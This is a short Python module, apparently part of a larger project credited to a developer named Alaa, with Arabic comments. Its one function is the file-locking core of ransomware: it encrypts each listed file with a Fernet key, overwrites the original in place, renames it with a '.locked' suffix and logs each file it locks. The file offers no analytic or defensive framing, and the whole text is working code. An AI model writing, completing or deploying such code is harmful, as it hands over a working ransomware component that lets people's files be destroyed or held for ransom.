from cryptography.fernet import Fernet
import os


# ==========================================
# Developer: Alaa
# Module: Encryption Algorithm
# ==========================================

def encrypt_files(files_list, key):
    """
    وظيفة آلاء: تشفير قائمة الملفات باستخدام المفتاح
    """
    count = 0
    cipher = Fernet(key)

    for file_path in files_list:
        try:
            if not file_path.endswith(".locked"):
                # قراءة الملف الأصلي
                with open(file_path, "rb") as f:
                    data = f.read()

                # التشفير
                encrypted_data = cipher.encrypt(data)

                # حفظ البيانات المشفرة
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)

                # تغيير الاسم
                os.rename(file_path, file_path + ".locked")
                count += 1
                print(f"[Alaa-Encryption] Encrypted: {file_path}")
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")

    return count

